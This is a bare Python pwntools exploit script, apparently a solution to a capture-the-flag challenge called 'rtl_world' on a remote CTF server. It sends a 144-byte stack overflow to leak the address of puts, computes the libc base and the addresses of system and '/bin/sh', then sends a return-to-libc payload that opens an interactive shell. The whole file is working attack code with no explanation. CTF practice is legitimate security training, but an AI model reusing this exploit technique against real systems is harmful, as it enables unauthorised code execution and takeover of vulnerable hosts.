from pwn import *

context.arch = 'i386'
context.terminal=['tmux', 'splitw', '-h']

#p = process("./rtl_world")
p = remote('ctf.j0n9hyun.xyz' ,3010)
e = ELF("./rtl_world")
#gdb.attach(p, 'b*0x08048bec')
pop_ret = 0x8048545
puts_plt = e.plt['puts']
puts_got = e.got['puts']

print p.recvuntil(">>> ")
p.sendline(str(5))
print p.recvuntil("[Attack] > ")

payload = ''
payload += "A"*144
payload += p32(puts_plt)
payload += p32(0x8048983)
payload += p32(puts_got)

payload += p32(puts_plt)
p.sendline(payload)
puts_addr = u32(p.recv(4))
libc_base = puts_addr - 0x67ca0
system_addr = libc_base + 0x3d2e0
binsh = libc_base + 0x17e0af
print "puts_addr :",hex(puts_addr)
print "libc_base :",hex(libc_base)
print "system_addr :",hex(system_addr)
print "binsh :",hex(binsh)

print p.recvuntil(">>> ")
p.sendline(str(5))
print p.recvuntil("[Attack] > ")

payload = ''
payload += "A"*144
payload += p32(system_addr)
payload += "AAAA"
payload += p32(binsh)

p.sendline(payload)
p.interactive()
